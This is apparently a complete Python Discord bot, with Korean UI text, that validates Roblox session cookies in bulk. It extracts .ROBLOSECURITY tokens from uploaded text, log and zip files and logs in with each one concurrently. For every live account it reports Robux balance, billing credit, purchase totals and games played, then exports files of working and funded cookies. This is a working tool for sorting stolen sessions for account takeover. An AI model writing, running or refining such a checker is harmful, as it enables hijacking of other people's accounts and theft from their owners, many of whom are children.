# -*- coding: utf-8 -*-
import os, re, io, asyncio, aiohttp, datetime as dt, random, zipfile, time
import discord
from discord.ext import commands
from discord import Interaction, TextStyle
from discord.ui import View, Modal, TextInput

# ========================
# 환경변수
# ========================
TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")  # 선택

# ========================
# 표시/동작 정책
# ========================
MENU_PUBLIC = True
RESULTS_EPHEMERAL = True           # 서버 인터랙션 응답은 에페메럴
CHUNK_SIZE = 500                   # 청크 크기(사실상 무제한)
CONCURRENCY_AUTH = 8               # 인증 동시성
CONCURRENCY_BADGE = 5              # 배지/판정 동시성
CONCURRENCY_ECON = 6               # 로벅스/지출 동시성
MAX_TOTAL = 0                      # 0이면 입력 상한 해제
MAX_TRX_PAGES = 10                 # 지출 합계 조회 최대 페이지(1p=100건)

# ========================
# 전역 네트워크(지연 생성: 3.13 호환)
# ========================
AIOHTTP_TIMEOUT = aiohttp.ClientTimeout(total=25, sock_connect=5, sock_read=20)
TCP_CONN: aiohttp.TCPConnector | None = None  # 지연 생성

def new_session(cookies=None):
    global TCP_CONN
    if TCP_CONN is None:
        TCP_CONN = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=20,
            ttl_dns_cache=300,
            enable_cleanup_closed=True
        )
    return aiohttp.ClientSession(
        timeout=AIOHTTP_TIMEOUT,
        connector=TCP_CONN,
        cookies=cookies or {},
        headers={"Accept-Encoding": "gzip", "Connection": "keep-alive"}
    )

# ========================
# UI/공통
# ========================
EMO = {"ok":"✅","warn":"⚠️","err":"❌"}
COLOR_BLACK = discord.Color.from_rgb(0, 0, 0)
COLOR_BLUE = discord.Color.blurple()
COLOR_GREEN = discord.Color.green()

# 커스텀 이모지
EM_CUSTOM = {
    "grow": "<:emoji_20:1413786764744720436>",
    "adopt": "<:emoji_19:1413786747921371226>",
    "brainrot": "<:emoji_18:1413786729718753>",   # 교체 적용
    "blox": "<:emoji_17:1413786669001216071>",
    "robux": "<:emoji_11:1411978635480399963>",
}

# 게임별 아이콘
GAME_ICON = {
    "grow_a_garden": EM_CUSTOM["grow"],
    "adopt_me": EM_CUSTOM["adopt"],
    "brainrot": EM_CUSTOM["brainrot"],
    "blox_fruits": EM_CUSTOM["blox"],
}

# 커스텀 이모지 폴백(권한/접근 문제시) — 유니코드로 교체
GAME_ICON_FALLBACK = {
    "grow_a_garden": "EMOJI_2",
    "adopt_me": "EMOJI_3",
    "brainrot": "EMOJI_4",
    "blox_fruits": "EMOJI_5",
}
def emoji_for_game(key: str) -> str:
    e = GAME_ICON.get(key)
    if not e or not e.startswith("<"):  # 커스텀 이모지 문법이 아니면 폴백
        return GAME_ICON_FALLBACK.get(key, "EMOJI_6")
    return e

# 검증 카운트용 커스텀 이모지(총/성공/실패)
COUNT_EMO = {
    "total": "<a:emoji_9:1411690730010972282>",
    "ok":    "<a:emoji_8:1411690712344301650>",
    "fail":  "<a:emoji_7:1411690688403345528>",
}
def em_total():
    v = COUNT_EMO.get("total") or ""
    return v if v.strip() else "EMOJI_7"  # 폴백 교체
def em_ok():
    v = COUNT_EMO.get("ok") or ""
    return v if v.strip() else "✅"
def em_fail():
    v = COUNT_EMO.get("fail") or ""
    return v if v.strip() else "❌"

# 처리 시간(이번 청크) 라벨 이모지
CHUNK_LABEL_EMO = "<a:emoji_21:1413797526993371146>"
def chunk_emo():
    v = (CHUNK_LABEL_EMO or "").strip()
    return v if v else "⏱️"

# 숫자/시간/화폐 포맷
def fmt_num(n: int | float) -> str:
    try:
        return f"{int(n):,}"
    except:
        try:
            return f"{float(n):,.2f}"
        except:
            return str(n)

def fmt_rbx(n: int | float) -> str:
    return f"{fmt_num(n)} R$"

def fmt_sec(s: float) -> str:
    return f"{s:.2f}초"

def make_embed(title: str | None = None, desc: str = "", color: discord.Color = COLOR_BLACK) -> discord.Embed:
    emb = discord.Embed(description=desc, color=color)
    if title:
        emb.title = title
    return emb

def main_menu_embed() -> discord.Embed:
    return discord.Embed(
        title="쿠키 체커기",
        description="원하는 체커방법을 선택하여 이용해주세요.",
        color=COLOR_BLACK
    )

async def send_result(inter: Interaction, *, embed: discord.Embed, view: discord.ui.View | None = None, files: list[discord.File] | None = None):
    if RESULTS_EPHEMERAL:
        if not inter.response.is_done():
            await inter.response.send_message(embed=embed, view=view, files=files, ephemeral=True)
        else:
            await inter.followup.send(embed=embed, view=view, files=files, ephemeral=True)
    else:
        if not inter.response.is_done():
            await inter.response.send_message(embed=embed, view=view, files=files)
        else:
            await inter.followup.send(embed=embed, view=view, files=files)

# ========================
# 게임 프리셋(고정)
# ========================
GAMES = {
    "그로우 어 가든": {"key":"grow_a_garden", "universeId":7436755782, "welcomeBadgeIds":[]},
    "입양하세요":    {"key":"adopt_me",      "universeId":383310974,  "welcomeBadgeIds":[]},
    "브레인롯":      {"key":"brainrot",      "universeId":7709344486, "welcomeBadgeIds":[]},
    "블록스피스":    {"key":"blox_fruits",   "universeId":994732206,  "welcomeBadgeIds":[]},
}

# ========================
# 파일/토큰 인식(강화)
# ========================
SUPPORTED_TEXT_EXT = {".txt", ".log", ".csv", ".json"}
SUPPORTED_ARCHIVE_EXT = {".zip"}

COOKIE_PATTERNS = [
    r"(_\|WARNING[^\s\"';]+)",
    r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s\"';]+)",
    r"(?i)\"ROBLOSECURITY\"\s*:\s*\"([^\"]+)\"",
    r"(?i)Cookie:\s*[^;]*ROBLOSECURITY\s*=\s*([^\s;]+)",
]

def extract_cookie_variants(s: str):
    if not s:
        return None, None
    s = s.strip()
    m_w = re.search(r"(_\|WARNING[^\s;]+)", s)
    if m_w:
        token = m_w.group(1).strip()
        return token, token
    m_eq = re.search(r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s;]+)", s)
    if m_eq:
        val = m_eq.group(1).strip()
        out = val[val.find("_|WARNING"):] if "_|WARNING" in val else val
        return val, out
    if len(s) > 50 and " " not in s and "\n" not in s and "\t" not in s:
        if "_|WARNING" in s:
            token = s[s.find("_|WARNING"):]
            return token, token
        return s, s
    return None, None

def find_tokens_in_text(text: str):
    out, seen = [], set()
    for pat in COOKIE_PATTERNS:
        for m in re.finditer(pat, text or ""):
            val = m.group(1).strip()
            auth = val[val.find("_|WARNING"):] if "_|WARNING" in val else val
            outv = auth if "_|WARNING" in val else val
            if auth not in seen:
                seen.add(auth)
                out.append((auth, outv))
    for line in (text or "").splitlines():
        auth, outv = extract_cookie_variants(line)
        if auth and (auth, outv) not in out:
            out.append((auth, outv))
    return out

# “_|WARNING…” 최우선 추출 → 없으면 백업 패턴 사용
def find_warning_tokens(text: str) -> list[tuple[str, str]]:
    out, seen = [], set()
    for m in re.finditer(r"(_\|WARNING[^\s\"';]+)", text or ""):
        tok = m.group(1).strip()
        if tok not in seen:
            seen.add(tok)
            out.append((tok, tok))
    return out

def extract_fallback_tokens(text: str) -> list[tuple[str, str]]:
    return find_tokens_in_text(text or "")

def parse_cookies_blob(raw: str) -> list[tuple[str, str]]:
    primary = find_warning_tokens(raw or "")
    if primary:
        return primary
    return extract_fallback_tokens(raw or "")

async def extract_texts_from_attachment(att: discord.Attachment):
    name = (att.filename or "file").lower()
    data = await att.read()
    texts = []
    def dec(b: bytes):
        try:
            return b.decode("utf-8")
        except:
            return b.decode("utf-8", errors="ignore")
    if any(name.endswith(ext) for ext in SUPPORTED_ARCHIVE_EXT):
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                lname = info.filename.lower()
                if not any(lname.endswith(ext) for ext in SUPPORTED_TEXT_EXT):
                    continue
                if info.file_size > 10 * 1024 * 1024:
                    continue
                with zf.open(info, "r") as f:
                    texts.append(dec(f.read()))
        return texts or [dec(data)], "zip"
    return [dec(data)], "text"

# ========================
# 네트워크/로직(속도 최적화)
# ========================
async def fetch_json_with_retry(session: aiohttp.ClientSession, method: str, url: str, **kw):
    tries = 0
    while True:
        tries += 1
        try:
            async with session.request(method, url, **kw) as r:
                if r.status == 429:
                    ra = r.headers.get("Retry-After")
                    wait = float(ra) if ra else min(2 ** tries, 10) + random.random()
                    await asyncio.sleep(wait)
                    if tries < 5:
                        continue
                if 500 <= r.status < 600 and tries < 4:
                    await asyncio.sleep(min(2 ** tries, 6) + random.random())
                    continue
                if r.status >= 400:
                    try:
                        data = await r.json()
                    except:
                        data = {"error": await r.text()}
                    return r.status, data
                return r.status, await r.json()
        except Exception as e:
            if tries >= 4:
                return 599, {"error": f"{type(e).__name__}: {e}"}
            await asyncio.sleep(min(2 ** tries, 5) + random.random())

async def check_cookie_once(cookie_value: str):
    try:
        async with new_session(cookies={'.ROBLOSECURITY': cookie_value}) as s:
            st, data = await fetch_json_with_retry(s, "GET", "https://users.roblox.com/v1/users/authenticated")
            if st == 200 and isinstance(data, dict) and data.get("id"):
                return True, None, int(data["id"]), data.get("name") or data.get("displayName")
            if st in (401, 403):
                return False, None, None, None
            return False, f"unexpected {st}", None, None
    except Exception as e:
        return False, f"{type(e).__name__}: {e}", None, None

async def bulk_authenticate(pairs):
    sem = asyncio.Semaphore(CONCURRENCY_AUTH)
    async def worker(auth):
        async with sem:
            return await check_cookie_once(auth)
    return await asyncio.gather(*[worker(auth) for auth, _ in pairs])

async def get_user_badges(user_id: int, session: aiohttp.ClientSession, limit: int = 100):
    out, cursor = [], None
    base = f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100&sortOrder=Desc"
    for _ in range((limit + 99) // 100):
        url = base + (f"&cursor={cursor}" if cursor else "")
        st, data = await fetch_json_with_retry(session, "GET", url)
        if st != 200:
            break
        out.extend(data.get("data", []))
        cursor = data.get("nextPageCursor")
        if not cursor or len(out) >= limit:
            break
    return out[:limit]

async def get_played_games_for_user(user_id: int, auth_cookie: str):
    played = set()
    try:
        async with new_session(cookies={'.ROBLOSECURITY': auth_cookie}) as s:
            badges = await get_user_badges(user_id, s, limit=100)
            uni_by_key = {cfg["key"]: int(cfg["universeId"]) for _, cfg in GAMES.items() if cfg.get("universeId")}
            for b in badges:
                uni = b.get("awardingUniverse")
                if not isinstance(uni, dict):
                    continue
                uid = int(uni.get("id") or 0)
                for k, u in uni_by_key.items():
                    if u == uid:
                        played.add(k)
            return played
    except:
        return played

# ========================
# 로벅스 잔액/전체 지출
# ========================
async def fetch_robux_balance(user_id: int, session: aiohttp.ClientSession) -> int:
    st, data = await fetch_json_with_retry(session, "GET", f"https://economy.roblox.com/v1/users/{user_id}/currency")
    if st == 200 and isinstance(data, dict):
        return int(data.get("robux", 0))
    return 0

async def sum_total_spend(user_id: int, session: aiohttp.ClientSession, max_pages: int = MAX_TRX_PAGES) -> int:
    total = 0
    cursor = None
    pages = 0
    base = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=100"
    while pages < max_pages:
        url = base + (f"&cursor={cursor}" if cursor else "")
        st, data = await fetch_json_with_retry(session, "GET", url)
        if st != 200 or not isinstance(data, dict):
            break
        for row in data.get("data", []):
            amt = int(row.get("amount", 0))
            total += abs(amt)
        cursor = data.get("nextPageCursor")
        pages += 1
        if not cursor:
            break
    return total

async def get_robux_and_spend(user_id: int, auth_cookie: str) -> tuple[int, int]:
    try:
        async with new_session(cookies={'.ROBLOSECURITY': auth_cookie}) as s:
            bal, spend = await asyncio.gather(
                fetch_robux_balance(user_id, s),
                sum_total_spend(user_id, s, MAX_TRX_PAGES)
            )
            return bal, spend
    except:
        return 0, 0

# ========================
# DM 처리(청크 분할 + 임베드 결과 + 시간 측정)
# ========================
def chunked(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i+n]

async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
    t0_total = time.perf_counter()

    pairs = parse_cookies_blob(raw_text)
    if not pairs:
        return await dm.send(embed=make_embed("쿠키 없음", "파일에서 쿠키를 찾지 못했습니다.", color=COLOR_BLACK))

    if MAX_TOTAL and len(pairs) > MAX_TOTAL:
        pairs = pairs[:MAX_TOTAL]

    total_cnt = len(pairs)
    done_cnt = 0
    chunk_idx = 0

    for part in chunked(pairs, CHUNK_SIZE):
        chunk_idx += 1
        t0_chunk = time.perf_counter()

        # 1) 인증
        auth_results = await bulk_authenticate(part)
        ok_entries = []
        for (auth, outv), res in zip(part, auth_results):
            ok, err, uid, uname = res
            if ok and uid:
                ok_entries.append((auth, outv, uid, uname))

        # 2) 게임 판정
        game_buckets: dict[str, list[str]] = {}
        if ok_entries:
            sem_badge = asyncio.Semaphore(CONCURRENCY_BADGE)
            async def one_badge(item):
                auth, outv, uid, uname = item
                async with sem_badge:
                    keys = await get_played_games_for_user(uid, auth)
                    return outv, keys
            played_results = await asyncio.gather(*[one_badge(it) for it in ok_entries])
            for outv, keys in played_results:
                for k in keys:
                    game_buckets.setdefault(k, []).append(outv)

        # 3) 로벅스 잔액/전체 지출
        total_robux_sum = 0
        total_spend_sum = 0
        robux_positive_list: list[str] = []
        if ok_entries:
            sem_econ = asyncio.Semaphore(CONCURRENCY_ECON)
            async def one_econ(item):
                auth, outv, uid, uname = item
                async with sem_econ:
                    bal, spend = await get_robux_and_spend(uid, auth)
                    return outv, bal, spend
            econ_results = await asyncio.gather(*[one_econ(it) for it in ok_entries])
            for outv, bal, spend in econ_results:
                total_robux_sum += max(bal, 0)
                total_spend_sum += max(spend, 0)
                if bal > 0:
                    robux_positive_list.append(outv)

        # 4) 파일 구성
        files: list[discord.File] = []
        if ok_entries:
            buf_valid = io.BytesIO(("\n".join(outv for _, outv, _, _ in ok_entries)).encode("utf-8"))
            files.append(discord.File(buf_valid, filename=f"valid_cookies_part{chunk_idx}.txt"))

        if robux_positive_list:
            buf_pos = io.BytesIO(("\n".join(robux_positive_list)).encode("utf-8"))
            files.append(discord.File(buf_pos, filename=f"robux_positive_part{chunk_idx}.txt"))

        fn_map = {
            "grow_a_garden": f"grow_a_garden_part{chunk_idx}.txt",
            "adopt_me":      f"adopt_me_part{chunk_idx}.txt",
            "brainrot":      f"brainrot_part{chunk_idx}.txt",
            "blox_fruits":   f"blox_fruits_part{chunk_idx}.txt",
        }
        key_to_display = {cfg["key"]: disp for disp, cfg in GAMES.items()}

        # ───────── 임베드(정돈된 레이아웃) ─────────
        elapsed_chunk = time.perf_counter() - t0_chunk

        # 게임별 표시
        order = ["grow_a_garden", "adopt_me", "brainrot", "blox_fruits"]
        pretty_lines = []
        for k in order:
            disp = key_to_display.get(k, k)
            icon = emoji_for_game(k)
            cnt = len(game_buckets.get(k, []))
            pretty_lines.append(f"{icon} {disp}: {fmt_num(cnt)}개")

        desc = f"[{chunk_idx}] 처리 청크: {fmt_num(len(part))}개"

        ok_color = discord.Color.from_rgb(0, 180, 110)
        err_color = discord.Color.from_rgb(200, 60, 60)
        color_pick = ok_color if len(ok_entries) > 0 else err_color
        title_emoji = "✅" if len(ok_entries) > 0 else "❌"

        emb = discord.Embed(
            title=f"{title_emoji} 파일 검증 결과 (청크 {chunk_idx})",
            description=desc,
            color=color_pick
        )
        emb.timestamp = dt.datetime.now(dt.timezone.utc)

        # 1) 검증 수
        next_done = done_cnt + len(part)
        emb.add_field(
            name="검증 수",
            value="\n".join([
                f"{em_total()} 총(누적/전체): {fmt_num(next_done)} / {fmt_num(total_cnt)}",
                f"{em_ok()} 성공: {fmt_num(len(ok_entries))}",
                f"{em_fail()} 실패: {fmt_num(len(part) - len(ok_entries))}",
            ]),
            inline=True
        )

        # 2) 게임플레이
        emb.add_field(
            name="게임플레이",
            value="\n".join(pretty_lines) if pretty_lines else "게임별 분류 결과 없음",
            inline=True
        )

        # 3) 로벅스 요약(제목 이모지 제거, 라인별 로벅스 이모지)
        emb.add_field(
            name="로벅스 요약",
            value="\n".join([
                f"{EM_CUSTOM['robux']} 보유 합계: {fmt_rbx(total_robux_sum)}",
                f"{EM_CUSTOM['robux']} 지출 합계: {fmt_rbx(total_spend_sum)}",
                f"{EM_CUSTOM['robux']} 잔액: {fmt_num(len(robux_positive_list))}개",
            ]),
            inline=False
        )

        # 4) 처리 시간(이번 청크만 표시)
        emb.add_field(
            name="처리 시간",
            value=f"{chunk_emo()} {fmt_sec(elapsed_chunk)}",
            inline=False
        )

        emb.set_footer(text="Cookie Checker • DM 전용 • 안정 검증 모드")

        done_cnt = next_done
        await dm.send(embed=emb, files=files or None)

# ========================
# 모달(전체 조회) — 즉시 ACK + 파싱 통일 + 불필요 항목 제거
# ========================
class TotalCheckModal(Modal, title="전체 조회"):
    cookie = TextInput(
        label="로블록스 쿠키",
        placeholder="_|WARNING… 또는 .ROBLOSECURITY=…",
        style=TextStyle.short,
        required=True,
        max_length=4000
    )
    async def on_submit(self, inter: Interaction):
        await inter.response.defer(ephemeral=RESULTS_EPHEMERAL)
        try:
            await inter.followup.send(embed=make_embed("진행 중", "계정 정보를 조회 중입니다.", color=COLOR_BLUE), ephemeral=True)

            # 쿠키 정제(파일검증과 동일)
            pairs = parse_cookies_blob(self.cookie.value)
            if not pairs:
                return await inter.followup.send(
                    embed=make_embed("입력 필요", "쿠키를 찾지 못했습니다. “_|WARNING…” 또는 “.ROBLOSECURITY=…” 형태로 넣어줘.", color=COLOR_BLUE),
                    ephemeral=True
                )

            # 여러 줄 붙여넣었을 때 '유효한 첫 쿠키' 자동 선택
            def _clean(v: str) -> str:
                return (v or "").replace("\u200b", "").replace("\ufeff", "").strip()

            valid_cookie = None
            for auth, _ in pairs:
                token = _clean(auth)
                ok, _, uid, _ = await check_cookie_once(token)
                if ok and uid:
                    valid_cookie = token
                    break

            if not valid_cookie:
                return await inter.followup.send(
                    embed=make_embed("유효하지 않은 쿠키", "붙여넣은 쿠키들로 로그인을 못 했습니다.", color=COLOR_BLUE),
                    ephemeral=True
                )

            async with new_session(cookies={'.ROBLOSECURITY': valid_cookie}) as s:
                st, data = await fetch_json_with_retry(s, "GET", "https://users.roblox.com/v1/users/authenticated")
                if st != 200 or not data.get("id"):
                    return await inter.followup.send(
                        embed=make_embed("유효하지 않은 쿠키", "로그인 실패", color=COLOR_BLUE),
                        ephemeral=True
                    )
                user_id = data["id"]

                async def fj(url: str):
                    st, d = await fetch_json_with_retry(s, "GET", url)
                    return d

                # 경제/프로필/썸네일만
                robux_task = asyncio.create_task(fj(f'https://economy.roblox.com/v1/users/{user_id}/currency'))
                credit_task = asyncio.create_task(fj('https://billing.roblox.com/v1/credit'))
                settings_task = asyncio.create_task(fj('https://www.roblox.com/my/settings/json'))
                thumb_task = asyncio.create_task(fj(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds={user_id}'))
                spend_task = asyncio.create_task(sum_total_spend(user_id, s, MAX_TRX_PAGES))

                robux, credit, settings, thumb, total_spend = await asyncio.gather(
                    robux_task, credit_task, settings_task, thumb_task, spend_task
                )

            emb = make_embed(title="전체 조회", color=COLOR_BLUE)
            emb.set_thumbnail(url=(thumb.get('data', [{}])[0].get('imageUrl') or discord.Embed.Empty))
            emb.add_field(name="로벅스", value=f"{robux.get('robux', 0)} R$", inline=True)
            emb.add_field(name="전체 지출 합계", value=f"{total_spend} R$", inline=True)
            emb.add_field(name="크레딧", value=f"{credit.get('balance', 0)} {credit.get('currencyCode', '')}", inline=True)
            emb.add_field(name="닉네임", value=str(settings.get('Name')), inline=True)

            await inter.followup.send(embed=emb, ephemeral=True)

        except Exception as e:
            await inter.followup.send(embed=make_embed("요청 실패", f"{type(e).__name__}: {e}", color=COLOR_BLUE), ephemeral=True)

# ========================
# DM 파일검증 뷰(임베드 안내 → DM에서 업로드)
# ========================
class DMFilePromptView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=120)
        self.bot = bot
        self.busy = False

    @discord.ui.button(label="파일검증", style=discord.ButtonStyle.secondary, custom_id="file_dm_btn")
    async def dm_btn(self, inter: Interaction, button: discord.ui.Button):
        if self.busy:
            return await inter.response.send_message(embed=make_embed("안내", "이미 진행 중입니다. DM 확인해주세요.", color=COLOR_BLACK), ephemeral=True)
        self.busy = True
        try:
            dm = await inter.user.create_dm()
        except Exception as e:
            self.busy = False
            return await inter.response.send_message(embed=make_embed("DM 전송 실패", f"DM 허용을 켜주세요. ({e})", color=COLOR_BLACK), ephemeral=True)

        await inter.response.send_message(embed=make_embed("DM 안내", "DM 보냈습니다. DM에서 파일 올려주세요.", color=COLOR_BLACK), ephemeral=True)

        await dm.send(embed=make_embed(
            title="파일 검증",
            desc="여기에 파일을 올려줘.\n- 지원: txt / log / csv / json / zip\n- 제한: 2분 내 업로드",
            color=COLOR_BLACK
        ))

        def check_msg(m: discord.Message):
            return (not m.author.bot) and (m.author.id == inter.user.id) and (m.channel.id == dm.id) and (len(m.attachments) > 0)

        try:
            msg: discord.Message = await self.bot.wait_for("message", check=check_msg, timeout=120)
        except asyncio.TimeoutError:
            self.busy = False
            return await dm.send(embed=make_embed("시간 초과", "다시 서버에서 [파일검증] 눌러 시작해주세요.", color=COLOR_BLACK))

        att = msg.attachments[0]
        await dm.send(embed=make_embed("진행 중", "파일을 받았습니다. 검증을 시작하겠습니다.", color=COLOR_BLACK))

        try:
            t0 = time.perf_counter()
            texts, _ = await extract_texts_from_attachment(att)
            combined = "\n\n".join(texts)
            await handle_file_check_logic_dm(dm, combined)
            t_total = time.perf_counter() - t0
            await dm.send(embed=make_embed("전체 처리 완료", f"{chunk_emo()} 총 처리 시간: {fmt_sec(t_total)}", color=COLOR_BLACK))
        except Exception as e:
            await dm.send(embed=make_embed("처리 실패", f"{type(e).__name__}: {e}", color=COLOR_BLACK))
        finally:
            self.busy = False

# ========================
# 버튼 뷰(쿠키검증 제거, 전부 회색)
# ========================
class CheckView(View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="전체조회", style=discord.ButtonStyle.secondary, custom_id="total_check_btn")
    async def b2(self, inter: Interaction, button: discord.ui.Button):
        await inter.response.send_modal(TotalCheckModal())

    @discord.ui.button(label="파일검증", style=discord.ButtonStyle.secondary, custom_id="file_check_btn")
    async def b3(self, inter: Interaction, button: discord.ui.Button):
        emb = make_embed(
            title="파일 검증",
            desc="아래 버튼을 누르면 봇이 DM 갑니다.",
            color=COLOR_BLACK
        )
        view = DMFilePromptView(inter.client)
        await inter.response.send_message(embed=emb, view=view, ephemeral=True)

# ========================
# 봇 본체
# ========================
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True  # DM 이벤트 안정 수신
        super().__init__(command_prefix=".", intents=intents)

    async def setup_hook(self):
        try:
            if GUILD_ID:
                gid = int(GUILD_ID)
                await self.tree.sync(guild=discord.Object(id=gid))
            else:
                await self.tree.sync()
        except Exception as e:
            print("[SYNC] 실패:", e)

bot = MyBot()

@bot.event
async def on_ready():
    try:
        bot.add_view(CheckView(bot))  # persistent view
        print("[VIEW] persistent CheckView 등록 완료")
    except Exception as e:
        print("[VIEW] 등록 실패:", e)
    print(f"{dt.datetime.now(dt.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC → 로그인: {bot.user}")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Cookie Checker"))

# ========================
# 메뉴(공개)
# ========================
@bot.tree.command(name="체커기", description="체커기 생성하기")
async def check(inter: Interaction):
    if MENU_PUBLIC:
        await inter.response.send_message(embed=main_menu_embed(), view=CheckView(bot))
    else:
        await inter.response.send_message(embed=main_menu_embed(), view=CheckView(bot), ephemeral=True)

# ========================
# 슬래시: 파일검증(바로 DM 안내)
# ========================
@bot.tree.command(name="파일검증", description="DM으로 파일을 받아 일괄 검증합니다")
async def file_check(inter: Interaction):
    emb = make_embed("DM 안내", "봇 DM 확인해주세요.", color=COLOR_BLACK)
    await inter.response.send_message(embed=emb, ephemeral=True)
    try:
        dm = await inter.user.create_dm()
        await dm.send(embed=make_embed(
            title="파일 검증",
            desc="여기에 파일을 올려주세요.\n- 지원 파일: txt / log / csv / json / zip\n- \n- 제한: 2분 내 업로드",
            color=COLOR_BLACK
        ))
    except Exception as e:
        await inter.followup.send(embed=make_embed("DM 전송 실패", f"DM 허용을 켜주세요. ({e})", color=COLOR_BLACK), ephemeral=True)

if __name__ == "__main__":
    if not TOKEN:
        raise RuntimeError("환경변수 DISCORD_TOKEN 이 설정되지 않았습니다.")
    bot.run(TOKEN)
